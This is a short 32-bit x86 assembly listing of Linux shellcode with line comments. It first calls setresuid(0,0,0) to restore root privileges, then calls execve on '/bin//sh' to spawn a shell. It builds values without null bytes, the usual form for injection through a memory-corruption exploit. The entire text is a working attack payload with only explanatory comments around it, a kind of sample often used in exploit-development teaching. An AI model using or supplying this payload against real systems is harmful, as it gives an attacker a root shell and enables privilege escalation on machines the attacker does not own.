BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; zero out eax
  xor ebx, ebx      ; zero out ebx
  xor ecx, ecx      ; zero out ecx
  xor edx, edx      ; zero out edx
  mov al,  0xa4     ; 164 (0xa4) for syscall #164
  int 0x80          ; setresuid(0, 0, 0)  restore all root privs

; execve(const char *pathname, char *const argv [], char *const envp[])
  xor eax, eax      ; zero out eax
  push eax          ; push 4-bytes null
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; (#1) address of "/bin//sh"
  push eax          ; push 4-bytes null
  mov edx, esp      ; (#3) empty array for envp
  push ebx          ; push ptr to /bin//sh string to stack
  mov ecx, esp      ; (#2) argv array, argv[0]=ebx
  mov al, 11        ; syscall #11 execve
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
